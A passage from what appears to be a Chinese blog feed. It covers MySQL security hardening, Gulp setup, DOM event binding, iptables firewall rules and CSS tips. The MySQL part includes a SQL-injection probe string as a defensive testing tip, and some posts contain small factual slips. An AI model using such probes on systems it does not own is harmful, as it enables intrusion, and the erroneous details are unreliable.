<code>%27(‘’’)</code>。</li><li>试试在动态 URL 中修改数据类型，使用前面示例中的字符，包括数字和字符类型。你的应用程序应足够安全，可以防范此类修改和类似攻击。</li><li>试试输入字符、空格和特殊符号，不要输入数值字段的数字。你的应用程序应在将它们传递到 MySQL 之前将它们删除或生成错误。将未经过检查的值传递给 MySQL 是很危险的！</li><li>将数据传给 MySQL 之前先检查其大小。</li><li>用管理账户之外的用户名将应用程序连接到数据库。不要给应用程序任何不需要的访问权限。</li></ul><h1 id="数据库备份策略"><a href="#数据库备份策略" class="headerlink" title="数据库备份策略"></a>数据库备份策略</h1><p>使用 <code>mysqldump</code> 可以把整个数据库装载到一个单独的文本文件中。这个文件包含有所有重建您的数据库所需要的 SQL 命令。</p><pre><code class="bash">mysqldump -u root -p mysql &gt; abc.sql
</code></pre><h1 id="mysqld-安全相关启动项"><a href="#mysqld-安全相关启动项" class="headerlink" title="mysqld 安全相关启动项"></a>mysqld 安全相关启动项</h1><p>下列 <code>mysqld</code> 选项影响安全：</p><ul><li><p><strong><code>--allow-suspicious-udfs</code></strong></p><ul><li>该选项控制是否可以载入主函数只有 xxx 符的用户定义函数。默认情况下，该选项被关闭，并且只能载入至少有辅助符的 UDF。这样可以防止从未包含合法 UDF 的共享对象文件载入函数。</li></ul></li><li><p><strong><code>--local-infile[={0|1}]</code></strong></p><ul><li>如果用 <code>–local-infile=0</code> 启动服务器，则客户端不能使用LOCAL in LOAD DATA语句。</li></ul></li><li><p><strong><code>--old-passwords</code></strong></p><ul><li>强制服务器为新密码生成短(<code>pre-4.1</code>)密码哈希。当服务器必须支持旧版本客户端程序时，为了保证兼容性这很有用。</li></ul></li><li><p><strong><code>(OBSOLETE) --safe-show-database</code></strong></p><ul><li>在以前版本的 MySQL 中，该选项使 <code>SHOW DATABASES</code> 语句只显示用户具有部分权限的数据库名。在 <code>MySQL 5.1</code> 中，该选项不再作为现在的 默认行为使用，有一个 <code>SHOW DATABASES</code> 权限可以用来控制每个账户对数据库名的访问。</li></ul></li><li><p><strong><code>--safe-user-create</code></strong></p><ul><li>如果启用，用户不能用 <code>GRANT</code> 语句创建新用户，除非用户有 <code>mysql.user</code> 表的 <code>INSERT</code> 权限。如果你想让用户具有授权权限来创建新用户，你应给用户授予下面的权限：<code>mysql&gt; GRANT INSERT(user) ON mysql.user TO ‘user_name’@&#39;host_name’;</code> 这样确保用户不能直接更改权限列，必须使用GRANT语句给其它用户授予该权限。</li></ul></li><li><p><strong><code>--secure-auth</code></strong></p><ul><li>不允许鉴定有旧(<code>pre-4.1</code>)密码的账户。</li></ul></li><li><p><strong><code>--skip-grant-tables</code></strong></p><ul><li>这个选项导致服务器根本不使用权限系统。这给每个人以完全访问所有的数据库的权力！（通过执行 <code>mysqladmin flush-privileges</code> 或 <code>mysqladmin eload</code> 命令，或执行 <code>FLUSH PRIVILEGES</code> 语句，你能告诉一个正在运行的服务器再次开始使用授权表。）</li></ul></li><li><p><strong><code>--skip-name-resolve</code></strong></p><ul><li>主机名不被解析。所有在授权表的 Host 的列值必须是 IP 号或 localhost。</li></ul></li><li><p><strong><code>--skip-networking</code></strong></p><ul><li>在网络上不允许 TCP/IP 连接。所有到 mysqld 的连接必须经由 Unix 套接字进行。</li></ul></li><li><p><strong><code>--skip-show-database</code></strong></p><ul><li>使用该选项，只允许有 <code>SHOW DATABASES</code> 权限的用户执行 <code>SHOW DATABASES</code> 语句，该语句显示所有数据库名。不使用该选项，允许所有用户执行 <code>SHOW DATABASES</code>，但只显示用户有 <code>SHOW DATABASES</code> 权限或部分数据库权限的数据库名。请注意全局权限指数据库的权限。</li></ul></li></ul><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Service </tag>
            
            <tag> MySQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Gulp 使用指南]]></title>
      <url>/2016/10/gulp-usage-guide/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>本文主要介绍如何使用 Gulp.js，来帮助你构建一个自动化的前端开发流程。总结并归类自身使用中所遇到的方法、问题，便于新人上手和理解，同时也作为一份 Gulp 参考文档来使用，让你对 Gulp 有个更深入的了解<a id="more"></a></p><h1 id="Gulp-是什么"><a href="#Gulp-是什么" class="headerlink" title="Gulp 是什么"></a>Gulp 是什么</h1><p>Gulp 是基于 <code>Node.js</code> 的一个构建工具（自动任务运行器），开发者可以使用它构建自动化工作流程（前端集成开发环境）。一些常见、重复的任务，例如：网页自动刷新、CSS 预处理、代码检测、压缩图片、等等，只需用简单的命令就能全部完成。使用它，可以简化工作，让你把重点放在功能开发上；同时减少人为失误，提高开发效率和项目质量，让专注更为专注。如果你之前接触过 Grunt，那上手 Gulp 就会觉得非常容易理解。</p><h1 id="为什么使用-Gulp-而不使用-Grunt"><a href="#为什么使用-Gulp-而不使用-Grunt" class="headerlink" title="为什么使用 Gulp 而不使用 Grunt"></a>为什么使用 Gulp 而不使用 Grunt</h1><p>构建前端自动化的工具有很多，如：<code>Grunt</code>, <code>Brunch</code>, <code>Broccoli</code> 等，而目前过内最流行的属于 Grunt，之前我也在用使用，那为什么选择 Gulp 来代替 Grunt？</p><p>简单的总结一下，有三点：</p><ul><li>简洁：Gulp 侧重 <code>“代码优于配置”(code over configuration)</code>。最直观的感受，更为简单和清晰，不需要像 Grunt 一样写一堆庞大的配置文件。</li><li>高效：Gulp 基于 <code>Node Streams（流</code>）来构建任务，避免磁盘反复 <code>I/O（读取/写入）</code>。每个任务都是单独执行（坚持做一件事并且做好它），这使得它速度更快、更为纯粹。</li><li>易学：Gulp 核心 API 只有 4 个。简洁的 API 易于上手，学习过程比较平滑。</li></ul><h1 id="Gulp-核心-API"><a href="#Gulp-核心-API" class="headerlink" title="Gulp 核心 API"></a>Gulp 核心 API</h1><p>Gulp 的核心 API 只有 4 个：<code>src</code>、<code>dest</code>、<code>task</code>、<code>watch</code></p><ul><li><code>gulp.src(globs[, options])</code> =&gt; 指明源文件路径。<strong>globs</strong>：路径模式匹配； <strong>options</strong>：可选参数；</li><li><code>gulp.dest(path[, options])</code> =&gt; 指明处理后的文件输出路径。<strong>path</strong>：路径（一个任务可以有多个输出路径）；<strong>options</strong>：可选参数；</li><li><code>gulp.task(name[, deps], fn)</code> =&gt; 注册任务。<strong>name</strong>：任务名称（通过 gulp name 来执行这个任务）； <strong>deps</strong>：可选的数组，在本任务运行中所需要所依赖的其他任务（当前任务在依赖任务执行完毕后才会执行）； <strong>fn</strong>：任务函数（function方法）；</li><li><code>gulp.watch(glob [, opts], tasks)</code> =&gt; 监视文件的变化并运行相应的任务。<strong>glob</strong>：路径模式匹配； <strong>opts</strong>：可以选配置对象； <strong>taks</strong>：执行的任务；</li></ul><blockquote><p><a href="//github.com/gulpjs/gulp/blob/master/docs/API.md">API 帮助文档</a></p></blockquote><h1 id="安装-Gulp"><a href="#安装-Gulp" class="headerlink" title="安装 Gulp"></a>安装 Gulp</h1><blockquote><p>安装 Gulp 之前要确定系统中安装了 Node.js，有了之后只需创建一个工作目录，以下操作均在工作目录下执行。</p></blockquote><h2 id="全局安装"><a href="#全局安装" class="headerlink" title="全局安装"></a>全局安装</h2><p>深入设置任务之前，需先安装 gulp：</p><pre><code class="bash">npm install gulp -g
</code></pre><p>这会将 gulp 安装到全域环境下，让你可以存取 gulp 的 CLI。</p><h2 id="本地安装"><a href="#本地安装" class="headerlink" title="本地安装"></a>本地安装</h2><p>接着，需要在本地的工在目录进行安装。切换至你的工作目录，执行以下命令（当然执行之前要先确定该目录下有 <code>package.json</code> 文件，如果没有可以通过 <code>npm init</code> 进行创建）</p><pre><code class="bash">npm install gulp --save-dev
</code></pre><p>上述指令将 gulp 安装到本地的工作目录，并纪录于 <code>package.json</code> 中的 <code>devDependencies</code> 选项内。</p><h1 id="安装-Gulp-插件"><a href="#安装-Gulp-插件" class="headerlink" title="安装 Gulp 插件"></a>安装 Gulp 插件</h1><h2 id="推荐插件"><a href="#推荐插件" class="headerlink" title="推荐插件"></a>推荐插件</h2><ul><li>静态服务器 (<a href="//github.com/schickling/gulp-webserver">gulp-webserver</a>)</li><li>网页自动刷新 ([gulp-livereload][<a href="https://github.com/vohof/gulp-livereload" target="_blank" rel="external">https://github.com/vohof/gulp-livereload</a>])</li><li>编译 <strong>Sass</strong> (<a href="//github.com/sindresorhus/gulp-ruby-sass">gulp-ruby-sass</a>)</li><li><strong>Autoprefixer</strong> (<a href="//github.com/Metrime/gulp-autoprefixer">gulp-autoprefixer</a>)</li><li>缩小化(minify) <strong>CSS</strong> (<a href="//github.com/jonathanepollack/gulp-minify-css">gulp-minify-css</a>)</li><li><strong>JSHint</strong> (<a href="//github.com/wearefractal/gulp-jshint">gulp-jshint</a>)</li><li>拼接 (<a href="//github.com/wearefractal/gulp-concat">gulp-concat</a>)</li><li>丑化(Uglify) (<a href="//github.com/terinjokes/gulp-uglify">gulp-uglify</a>)</li><li>图片压缩 (<a href="//github.com/sindresorhus/gulp-imagemin">gulp-imagemin</a>)</li><li>即时重整(LiveReload) (<a href="//github.com/vohof/gulp-livereload">gulp-livereload</a>)</li><li>清理档案 (<a href="//github.com/peter-vilja/gulp-clean">gulp-clean</a>)</li><li>图片快取，只有更改过得图片会进行压缩 (<a href="//github.com/jgable/gulp-cache/">gulp-cache</a>)</li><li>更动通知 (<a href="//github.com/mikaelbr/gulp-notify">gulp-notify</a>)</li></ul><h2 id="通过-npm-进行安装"><a href="#通过-npm-进行安装" class="headerlink" title="通过 npm 进行安装"></a>通过 npm 进行安装</h2><p><code>Install Format:</code></p><pre><code class="bash">npm install [Module_Name] --save-dev
</code></pre><h1 id="Gulp-任务配置"><a href="#Gulp-任务配置" class="headerlink" title="Gulp 任务配置"></a>Gulp 任务配置</h1><h2 id="创建-gulpfile-js-文件"><a href="#创建-gulpfile-js-文件" class="headerlink" title="创建 gulpfile.js 文件"></a>创建 gulpfile.js 文件</h2><p>在项目根目录中，创建 <code>gulpfile.js</code> 文件，用来配置和定义任务（<code>task</code>）。</p><pre><code class="bash">touch gulpfile.js
</code></pre><h2 id="我的安装插件"><a href="#我的安装插件" class="headerlink" title="我的安装插件"></a>我的安装插件</h2><pre><code class="bash">npm install gulp --save-dev               # 基础库
npm install gulp-livereload --save-dev    # 网页自动刷新
npm install gulp-webserver --save-dev     # 本地服务器
npm install gulp-notify --save-dev        # 更新
</code></pre><h2 id="我的-gulpfile-js-配置"><a href="#我的-gulpfile-js-配置" class="headerlink" title="我的 gulpfile.js 配置"></a>我的 gulpfile.js 配置</h2><p>打开 <code>gulpfile.js</code> 文件，填写相关配置。</p><pre><code class="javascript">// 引入 gulp
var gulp = require(&#39;gulp&#39;); // 基础库

// 引入 gulp 插件
var livereload = require(&#39;gulp-livereload&#39;); // 网页自动刷新（服务器控制客户端同步刷新）
var webserver = require(&#39;gulp-webserver&#39;); // 本地服务器

// 注册任务
gulp.task(&#39;webserver&#39;, function () {
  gulp.src( &#39;./&#39; ) // 服务器目录（./ 代表根目录）
  .pipe(webserver({ // 运行 gulp-webserver
      livereload: true, // 启用 LiveReload
      open: true // 服务器启动时自动打开网页
  }));
});

// 监听任务
gulp.task(&#39;watch&#39;,function (){
  gulp.watch(&#39;*.html&#39;, [&#39;html&#39;]); // 监听根目录下所有 .html 文件
});

// 默认任务
gulp.task(&#39;default&#39;,[&#39;webserver&#39;,&#39;watch&#39;]);
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> manual </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Node.js </tag>
            
            <tag> Gulp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript 中的 DOM 事件]]></title>
      <url>/2016/10/dom-event-in-javascript/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>这篇文章主要介绍了 JavaScript 中 DOM 0 级事件和 DOM 2 级事件的区别介绍<a id="more"></a></p><h1 id="DOM-0-级事件"><a href="#DOM-0-级事件" class="headerlink" title="DOM 0 级事件"></a>DOM 0 级事件</h1><h2 id="写在标签里"><a href="#写在标签里" class="headerlink" title="写在标签里"></a>写在标签里</h2><pre><code class="html">&lt;a href=&quot;#&quot; id=&quot;main&quot; onclick=&quot;fn();fn1();&quot;&gt;
  &lt;button type=&quot;button&quot;&gt;this is button&lt;/button&gt;
&lt;/a&gt;
</code></pre><p>如上所示，把 <code>onclick</code> 写在标签内，都是 DOM 0 级事件，方法 fn 和 fn1 依次执行</p><h2 id="绑定事件"><a href="#绑定事件" class="headerlink" title="绑定事件"></a>绑定事件</h2><pre><code class="javascript">var ele = document.getElementById(&quot;main&quot;);
ele.onclick = function () {
  console.log(&quot;做第一件事&quot;);
}
</code></pre><p>这也是 DOM 0 级事件方法，我们需要用 <code>XXX.onYYY=ZZZ</code> 这种形式来绑定事件，当点击元素时，会输出 <code>&quot;做第一件事&quot;</code>，恩，很理想。</p><p>接下来，当我们希望在点击该元素的时候再做另一件事怎么办呢？下面这样：</p><pre><code class="javascript">ele.onclick = function () {
  console.log(&quot;做第二件事&quot;);
}
</code></pre><p>这样肯定不行，因为我们是希望点击时既输出 <code>“做一件事”</code>，又要输出 <code>“做第二件事”</code>。而这样的话后面的方法将前面的覆盖掉了，因为 <code>XXX.onYYY=ZZZ</code> 只能给元素的某个事件类型(如例子中的 <code>click 事件</code>)绑定一个方法 <code>ZZZ</code>；这个问题难不到我们，既然这样，那我们就把要做的事情全都放在 <code>ZZZ</code> 里不就行了么；</p><pre><code class="javascript">function fn1 () {
  console.log(&quot;做第一件事&quot;);
}
function fn2 ( ){
  console.log(&quot;做第二件事&quot;);
}
ele.onclick = function () {
    fn1();
    fn2();
}
</code></pre><h1 id="dom-2-级事件"><a href="#dom-2-级事件" class="headerlink" title="dom 2 级事件"></a>dom 2 级事件</h1><h2 id="jQuery-绑定事件"><a href="#jQuery-绑定事件" class="headerlink" title="jQuery 绑定事件"></a>jQuery 绑定事件</h2><pre><code class="javascript">$(&#39;#hash&#39;).click(function () {
  alert(&#39;jQuery 的 DOM 2 级点击第一次&#39;);
});
$(&#39;#hash&#39;).click(function () {
  alert(&#39;jQuery 的 DOM 2 级点击第二次&#39;);
});
</code></pre><blockquote><p>通过 jQuery 方法来绑定事件，不会覆盖之前方法体里写的事件。</p></blockquote><h2 id="JavaScript-绑定事件"><a href="#JavaScript-绑定事件" class="headerlink" title="JavaScript 绑定事件"></a>JavaScript 绑定事件</h2><pre><code class="javascript">btn.addEventListener(&#39;click&#39;,function () {
  alert(&#39;原生 DOM 2 级第一次 click&#39;)
},false);
btn.addEventListener(&#39;click&#39;,function () {
  alert(&#39;原生 DOM 2 级第二次click&#39;)
},false)
</code></pre><blockquote><p>通过原生的 JavaScript 方法来绑定事件，会覆盖之前方法体里写的事件。</p></blockquote><h1 id="DOM-0-级和-DOM-1-级共存"><a href="#DOM-0-级和-DOM-1-级共存" class="headerlink" title="DOM 0 级和 DOM 1 级共存"></a>DOM 0 级和 DOM 1 级共存</h1><pre><code class="html">&lt;a href=&quot;#&quot; id=&quot;hash&quot; onclick=&quot;fn();fn1();&quot;&gt;
  &lt;button type=&quot;button&quot;&gt;返回上面进行开通&lt;/button&gt;
&lt;/a&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
function fn(){
  alert(&#39;ade&#39;);
}
function fn1(){
  alert(&#39;ade111&#39;);
}
var btn=$(&#39;#hash&#39;).get(0);
btn.onclick=function(){
  alert(&#39;111&#39;);
};
$(&#39;#hash&#39;).click(function(){
  alert(&#39;jQuery 的 DOM 2 级点击第一次&#39;);
});
btn.addEventListener(&#39;click&#39;,function(){
  alert(&#39;原生 DOM 2 级第一次 click&#39;)
},false);
&lt;/script&gt;
</code></pre><p>上面的例子有一个两个 DOM 0级和两个 DOM 2 级绑定事件，js 里面写的 DOM 0 级会覆盖行内的 fn和 fn1 方法，但是 js 里面的 DOM 0 可以和 dom2 共存。</p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> jQuery </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RedHat 系统安全加固（五）：防火墙 (iptables) 的设置]]></title>
      <url>/2016/10/iptables-settings/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本系列笔记又是 Liunx 学习系列教程的一大步，本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记记录 RedHat 下的防火请的开启和关闭，还有允许哪些端口通过防火墙<a id="more"></a></p><h1 id="防火墙的开启和关闭"><a href="#防火墙的开启和关闭" class="headerlink" title="防火墙的开启和关闭"></a>防火墙的开启和关闭</h1><h2 id="永久性生效"><a href="#永久性生效" class="headerlink" title="永久性生效"></a>永久性生效</h2><p>使用 <code>chkconfig</code>，重启后不会复原</p><pre><code class="bash">chkconfig iptables on         # 开启
chkconfig iptables off        # 关闭
</code></pre><h2 id="即时生效"><a href="#即时生效" class="headerlink" title="即时生效"></a>即时生效</h2><p>使用 <code>service</code>，重启后复原</p><pre><code class="bash">service iptables start        # 开启
service iptables stop         # 关闭
</code></pre><h1 id="iptables-命令解释"><a href="#iptables-命令解释" class="headerlink" title="iptables 命令解释"></a>iptables 命令解释</h1><h2 id="选项解释"><a href="#选项解释" class="headerlink" title="选项解释"></a>选项解释</h2><ul><li><strong>-t&lt;表&gt;</strong>：指定要操纵的表；</li><li><strong>-A</strong>：向规则链中添加条目；</li><li><strong>-D</strong>：从规则链中删除条目；</li><li><strong>-I</strong>：向规则链中插入条目；</li><li><strong>-R</strong>：替换规则链中的条目；</li><li><strong>-L</strong>：显示规则链中已有的条目；</li><li><strong>-F</strong>：清楚规则链中已有的条目；</li><li><strong>-Z</strong>：清空规则链中的数据包计算器和字节计数器；</li><li><strong>-N</strong>：创建新的用户自定义规则链；</li><li><strong>-P</strong>：定义规则链中的默认目标；</li><li><strong>-h</strong>：显示帮助信息；</li><li><strong>-p</strong>：指定要匹配的数据包协议类型；</li><li><strong>-s</strong>：指定要匹配的数据包源 ip 地址；</li><li><strong>-j&lt;目标&gt;</strong>：指定要跳转的目标；</li><li><strong>-i&lt;网络接口&gt;</strong>：指定数据包进入本机的网络接口；</li><li><strong>-o&lt;网络接口&gt;</strong>：指定数据包要离开本机所使用的网络接口。</li></ul><h2 id="命令输入顺序"><a href="#命令输入顺序" class="headerlink" title="命令输入顺序"></a>命令输入顺序</h2><pre><code class="bash">iptables -t 表名 &lt;-A/I/D/R&gt; 规则链名 [规则号] &lt;-i/o 网卡名&gt; -p 协议名 &lt;-s 源IP/源子网&gt; --sport 源端口 &lt;-d 目标IP/目标子网&gt; --dport 目标端口 -j 动作
</code></pre><ul><li><p><strong>表名包括</strong></p><ul><li><strong>raw</strong>：高级功能，如：网址过滤。</li><li><strong>mangle</strong>：数据包修改（QOS），用于实现服务质量。</li><li><strong>net</strong>：地址转换，用于网关路由器。</li><li><strong>filter</strong>：包过滤，用于防火墙规则。</li></ul></li><li><p><strong>规则链名包括</strong></p><ul><li><strong>INPUT 链</strong>：处理输入数据包。</li><li><strong>OUTPUT 链</strong>：处理输出数据包。</li><li><strong>PORWARD 链</strong>：处理转发数据包。</li><li><strong>PREROUTING 链</strong>：用于目标地址转换（DNAT）。</li><li><strong>POSTOUTING 链</strong>：用于源地址转换（SNAT）。</li></ul></li><li><p><strong>动作包括</strong></p><ul><li><strong>ACCEPT</strong>：接收数据包。</li><li><strong>DROP</strong>：丢弃数据包。</li><li><strong>REDIRECT</strong>：重定向、映射、透明代理。</li><li><strong>SNAT</strong>：源地址转换。</li><li><strong>DNAT</strong>：目标地址转换。</li><li><strong>MASQUERADE</strong>：IP 伪装（NAT），用于 ADSL。</li><li><strong>LOG</strong>：日志记录。</li></ul></li></ul><h1 id="iptables-的设置与查看"><a href="#iptables-的设置与查看" class="headerlink" title="iptables 的设置与查看"></a>iptables 的设置与查看</h1><h2 id="查看-iptables-的设置"><a href="#查看-iptables-的设置" class="headerlink" title="查看 iptables 的设置"></a>查看 iptables 的设置</h2><pre><code class="bash">iptables -nL
service iptables status
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/iptables-1.png" alt="iptables 的设置与查看"></p><h2 id="清除已有-iptables-规则"><a href="#清除已有-iptables-规则" class="headerlink" title="清除已有 iptables 规则"></a>清除已有 iptables 规则</h2><pre><code class="bash">iptables -F
iptables -X
iptables -Z
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/iptables-2.png" alt="iptables 的设置与查看"></p><h2 id="开放指定的端口"><a href="#开放指定的端口" class="headerlink" title="开放指定的端口"></a>开放指定的端口</h2><pre><code class="bash">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT
# 允许本地回环接口(即运行本机访问本机)

iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# 允许已建立的或相关连的通行

iptables -A OUTPUT -j ACCEPT
# 允许所有本机向外的访问

iptables -A INPUT -p tcp --dport 22 -j ACCEPT
# 允许访问 22 端口

iptables -A INPUT -p tcp --dport 80 -j ACCEPT
# 允许访问 80 端口

iptables -A INPUT -p tcp --dport 21 -j ACCEPT
# 允许 FTP  服务的 21 端口

iptables -A INPUT -p tcp --dport 20 -j ACCEPT
# 允许 FTP 服务的 20 端口

iptables -A INPUT -j reject
# 禁止其他未允许的规则访问

iptables -A FORWARD -j REJECT
# 禁止其他未允许的规则访问
</code></pre><blockquote><p><code>-A</code> 是在 <code>iptables</code> 的最后添加一条规则，<code>-I</code> 是在 <code>iptables</code> 的前面添加一条规则</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/iptables-3.png" alt="iptables 的设置与查看"></p><h2 id="屏蔽-IP"><a href="#屏蔽-IP" class="headerlink" title="屏蔽 IP"></a>屏蔽 IP</h2><pre><code class="bash">iptables -I INPUT -s 123.45.6.7 -j DROP
# 屏蔽单个 IP 的命令

iptables -I INPUT -s 123.0.0.0/8 -j DROP
# 封整个段即从 123.0.0.1 到 123.255.255.254 的命令

iptables -I INPUT -s 124.45.0.0/16 -j DROP
# 封 IP 段即从 123.45.0.1 到 123.45.255.254 的命令

iptables -I INPUT -s 123.45.6.0/24 -j DROP
# 封 IP 段即从 123.45.6.1 到 123.45.6.254 的命令
</code></pre><h2 id="保存当前设置的规则"><a href="#保存当前设置的规则" class="headerlink" title="保存当前设置的规则"></a>保存当前设置的规则</h2><pre><code class="bash">/etc/rc.d/init.d/iptables save
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/iptables-4.png" alt="iptables 的设置与查看"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/iptables-5.png" alt="iptables 的设置与查看"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[编写 CSS 代码的一些建议]]></title>
      <url>/2016/10/some-suggest-for-writing-css/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>想要写出高质量的 CSS 代码。那么这篇记录将大大提升你撰写 CSS 代码的效率<a id="more"></a></p><h1 id="明白何谓-Margin-Collapse"><a href="#明白何谓-Margin-Collapse" class="headerlink" title="明白何谓 Margin Collapse"></a>明白何谓 Margin Collapse</h1><blockquote><p>不同于其他很多属性。盒模型中垂直方向上的 <code>Margin</code> 会在相遇时发生崩塌。也就是说当某个元素的底部 <code>Margin</code> 与另一个元素的顶部 <code>Margin</code> 相邻时。只有二者中的较大值会被保留下来。</p></blockquote><p><code>For Example:</code></p><pre><code class="css">.square {
  width: 80px;
  height: 80px;
}

.red {
  background-color: #F44336;
  margin-bottom: 40px;
}

.blue {
  background-color: #2196F3;
  margin-top: 30px;
}
</code></pre><p>在上述例子中我们会发现。红色和蓝色方块的外边距并没有相加得到 <code>70px</code>。而是只有红色的下外边距保留了下来。我们可以使用一些方法来避免这种行为。不过建议来说还是尽量统一使用 <code>margin-bottom</code> 属性。这样就显得和谐多了。</p><h1 id="使用-Flexbox-进行布局"><a href="#使用-Flexbox-进行布局" class="headerlink" title="使用 Flexbox 进行布局"></a>使用 Flexbox 进行布局</h1><blockquote><p>在传统的布局中我们习惯使用 <code>Floats</code> 或者 <code>inline-blocks</code>。不过它们更适合于格式化文档。而不是整个网站。而 <code>Flexbox</code> 则是专门的用于进行布局的工具。<code>Flexbox</code> 模型允许开发者使用很多便捷可扩展的属性来进行布局。</p></blockquote><p><code>For Example:</code></p><pre><code class="css">.container {
  display: flex;
  display: -webkit-flex;
}
</code></pre><p>由于之前在本博客里详细介绍过 Flexbox 的布局方式，所以这里就不再重复，童鞋们可自行在本博客中搜索。</p><h1 id="使用-CSS-Reset"><a href="#使用-CSS-Reset" class="headerlink" title="使用 CSS Reset"></a>使用 CSS Reset</h1><blockquote><p>虽然这些年来随着浏览器的迅速发展与规范的统一，浏览器特性碎片化的情况有所改善，但是在不同的浏览器之间仍然存在着很多的行为差异。而解决这种问题的最好的办法就是使用某个 CSS Reset 来为所有的元素设置统一的样式，保证你能在相对统一干净的样式表的基础上开始工作。目前流行的 Reset 库有 <a href="//necolas.github.io/normalize.css/">normalize.css</a>, <a href="//jgthms.com/minireset.css/">minireset</a> 以及 <a href="//github.com/filipelinhares/ress">ress</a> ，它们都可以修正很多已知的浏览器之间的差异性。</p></blockquote><p>而如果你不打算用某个外在的库，那么建议可以使用如下的基本规则：</p><pre><code class="css">* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}
</code></pre><p>上面的规则看起来没啥用，不过如果不同的浏览器在默认情况下为你设置了不同的 <code>外边距/内边距</code> 的默认值，还是会挺麻烦的。</p><h1 id="一切应为-Border-box"><a href="#一切应为-Border-box" class="headerlink" title="一切应为 Border-box"></a>一切应为 Border-box</h1><blockquote><p>虽然很多初学者并不了解 <code>box-sizing</code> 这个属性，但是它确实相当的重要。而最好的理解它的方式就是看看它的两种取值：</p></blockquote><ul><li><p>默认值为 <code>content-box</code>，即当我们设置某个元素的 <code>heght/width</code> 属性时，仅仅会作用于其内容尺寸。而所有的内边距与边都是在其之上的累加，譬如某个 <code>&lt;div&gt;</code> 标签设置为宽 100，内边距为 10，那么最终元素会占用 <code>120(100 + 2*10)</code> 的像素。</p></li><li><p><code>border-box</code>：内边距与边是包含在了 <code>width/height</code> 之内，譬如设置了 <code>width:100px</code> 的 <code>&lt;div&gt;</code> 无论其内边距或者边长设置为多少，其占有的大小都是 <code>100px</code>。</p></li></ul><p>将元素设置为 <code>border-box</code> 会很方便你进行样式布局，这样的话你就可以在父元素设置高宽限制而不担心子元素的内边距或者边打破了这种限制。</p><h1 id="以背景图方式使用-Images"><a href="#以背景图方式使用-Images" class="headerlink" title="以背景图方式使用 Images"></a>以背景图方式使用 Images</h1><blockquote><p>如果需要在响应式的环境下展示图片，有个简单的小技巧就是使用该图片作为某个 <code>&lt;div&gt;</code> 的背景图而不是直接使用 img 标签。</p></blockquote><p>基于这种方式配合上 <code>background-size</code> 与 <code>background-position</code> 这两个属性，可以很方便地按比例缩放:</p><pre><code class="css">img {
  width: 300px;
  height: 200px;
}

div {
  width: 300px;
  height: 200px;
  background: url(&#39;//cdn.tutorialzine.com/wp-content/uploads/2016/08/bicycle.jpg&#39;);
  background-position: center center;
  background-size: cover;
}

section{
  float: left;
  margin: 15px;
}
</code></pre><p>不过这种方式也是存在缺陷的，譬如你无法设置图片的懒加载、图片无法被搜索引擎或者其他类似的工具抓取到，有个不错的属性叫 <a href="//tutorialzine.com/2016/04/quick-tip-get-to-know-css-object-fit-position/">object-fit</a> 可以解决这个问题，不过该属性目前的浏览器支持并不是很完善。</p><h1 id="Better-Table-Borders"><a href="#Better-Table-Borders" class="headerlink" title="Better Table Borders"></a>Better Table Borders</h1><blockquote><p>HTML 中使用 Tables 进行布局一直是个很头疼的问题，它们使用起来很简单，但是无法进行响应式操作，并且也不方便进行全局样式设置。</p></blockquote><p>譬如，如果你打算为 Table 的边与单元的边添加样式，可能得到的结果如下:</p><pre><code class="css">table {
  width: 600px;
  border: 1px solid #505050;
  margin-bottom: 15px;
  color:#505050;
}

td{
  border: 1px solid #505050;
  padding: 10px;
}
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/css-write-1.jpg" alt="CSS 代码编写"></p><p>这里存在的问题是出现了很多的重复的边，会导致视觉上不协调的情况，那么我们可以通过设置 <code>border-collapse:collapse</code> 来进行处理:<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/css-write-2.jpg" alt="CSS 代码编写"></p><h1 id="注释格式优化"><a href="#注释格式优化" class="headerlink" title="注释格式优化"></a>注释格式优化</h1><blockquote><p>CSS 虽然谈不上一门编程语言但是其仍然需要添加注释以保障整体代码的可读性，只要添加些简单的注释不仅可以方便你更好地组织整个样式表还能够让你的同事或者未来的自己更好地理解。</p></blockquote><p>对于 CSS 中整块的注释或者使用在 <code>Media-Query</code> 中的注释，建议是使用如下形式：</p><pre><code class="css">/*---------------
    #Header
---------------*/header { }header nav { }/*---------------
    #Slideshow
---------------*/.slideshow { }
</code></pre><p>而设计的细节说明或者一些不重要的组件可以用如下单行注释的方式：</p><pre><code class="css">/*   Footer Buttons   */
.footer button { }

.footer button:hover { }
